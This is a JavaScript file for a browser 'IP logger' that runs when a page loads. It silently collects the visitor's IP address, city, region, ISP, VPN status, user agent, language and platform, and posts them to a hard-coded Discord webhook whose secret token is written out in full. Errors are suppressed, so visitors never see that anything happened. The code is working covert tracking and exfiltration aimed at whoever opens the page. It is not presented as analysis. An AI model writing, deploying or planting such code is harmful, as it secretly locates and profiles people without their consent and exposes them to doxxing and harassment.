const MY_WEBHOOK = "https://discord.com/api/webhooks/1499504479169413151/iWlWtS3w7Zhp3mAS01KWdPfYSVbh-IOW99e095E4LAZdYSrGcPokxOEGUst8in5DMDZD";

class SimpleIPLogger {
    constructor() {
        this.webhookUrl = MY_WEBHOOK;
        this.init();
    }

    async init() {
        try {
            const ipData = await this.getIPInfo();
            await this.sendToDiscord(ipData);
        } catch (error) {
            // Silent fail
        }
    }

    async getIPInfo() {
        try {
            const proxyServices = [
                {
                    url: 'https://api.allorigins.win/raw?url=https://ipapi.co/json/',
                    parser: (data) => ({
                        ip: data.ip,
                        country: data.country_name || data.country,
                        city: data.city,
                        region: data.region || data.region_name,
                        isp: data.org || data.asn,
                        isVPN: data.proxy === true
                    })
                },
                {
                    url: 'https://corsproxy.io/?https://ipapi.co/json/',
                    parser: (data) => ({
                        ip: data.ip,
                        country: data.country_name || data.country,
                        city: data.city,
                        region: data.region || data.region_name,
                        isp: data.org || data.asn,
                        isVPN: data.proxy === true
                    })
                }
            ];

            for (const service of proxyServices) {
                try {
                    const response = await fetch(service.url);
                    if (response.ok) {
                        const data = await response.json();
                        const result = service.parser(data);
                        if (result.ip && result.ip !== 'undefined') {
                            return result;
                        }
                    }
                } catch (e) {
                    // Try next proxy
                }
            }

            // Fallback to basic IP
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            return { 
                ip: ipData.ip,
                country: 'Unknown',
                city: 'Unknown',
                region: 'Unknown',
                isp: 'Unknown'
            };
        } catch (error) {
            return { 
                ip: 'Error',
                country: 'Error',
                city: 'Error',
                region: 'Error',
                isp: 'Error'
            };
        }
    }

    async sendToDiscord(ipData) {
        const embed = {
            title: "🎯 IP Logger",
            color: 0x2f3136,
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "🌐 Network Info",
                    value: `**IP:** \`${ipData.ip || 'Unknown'}\`\n**Country:** \`${ipData.country || 'Unknown'}\`\n**City:** \`${ipData.city || 'Unknown'}\`\n**ISP:** \`${ipData.isp || 'Unknown'}\`\n**VPN:** \`${ipData.isVPN ? 'Yes' : 'No'}\``,
                    inline: true
                },
                {
                    name: "🔍 User Info",
                    value: `**User Agent:** \`\`\`${navigator.userAgent}\`\`\`\n**Language:** \`${navigator.language}\`\n**Platform:** \`${navigator.platform}\``,
                    inline: false
                }
            ],
            footer: {
                text: "Simple IP Logger"
            }
        };

        const payload = {
            embeds: [embed],
            username: "IP Logger"
        };

        try {
            await fetch(this.webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
        } catch (e) {}
    }
}

// Initialize logger
window.addEventListener('load', () => {
    new SimpleIPLogger();
});
